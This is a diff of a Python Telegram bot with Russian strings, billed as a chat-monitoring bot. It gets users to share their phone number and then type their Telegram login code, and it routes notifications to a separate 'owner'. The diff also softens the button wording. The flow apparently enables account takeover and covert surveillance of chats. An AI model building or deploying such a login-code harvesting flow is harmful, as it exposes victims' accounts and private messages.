@@ -60,7 +60,7 @@ async def handler(event):
                 f"📬 Все уведомления будут приходить сюда.\n\n"
                 f"📞 **Теперь нужно войти в твой аккаунт.**\n"
                 f"Нажми кнопку ниже, чтобы отправить номер телефона.",
-                buttons=[[Button.request_contact("📞 Отправить номер")]]
+                buttons=[[Button.request_contact("📞 Поделиться контактом")]]
             )
             notification_targets[user_id] = owner.id
             logger.info(f"Владелец установлен: {owner_username}")
@@ -69,12 +69,7 @@ async def handler(event):
             owner_username = None
         return
 
-    # === 2. ПОЛУЧЕНИЕ НОМЕРА ===
-    if user_id in waiting_for_phone:
-        # Этот блок уже обрабатывается contact_handler
-        return
-
-    # === 3. ВВОД КОДА ===
+    # === 2. ВВОД КОДА ===
     if user_id in waiting_for_code:
         phone = waiting_for_code[user_id]
         code = text.strip()
@@ -108,7 +103,7 @@ async def handler(event):
         del waiting_for_code[user_id]
         return
 
-    # === 4. ОБЫЧНЫЕ КОМАНДЫ ===
+    # === 3. ОБЫЧНЫЕ КОМАНДЫ ===
     if text == "/start":
         await event.reply(
             "👋 **Бот для мониторинга чатов**\n\n"
@@ -127,11 +122,11 @@ async def handler(event):
 
 @bot.on(events.NewMessage(func=lambda e: e.message.contact))
 async def contact_handler(event):
+    """Обработка полученного контакта"""
     user_id = event.sender_id
     contact = event.message.contact
     phone = contact.phone_number
     
-    waiting_for_phone[user_id] = True
     waiting_for_code[user_id] = phone
     
     await event.reply(
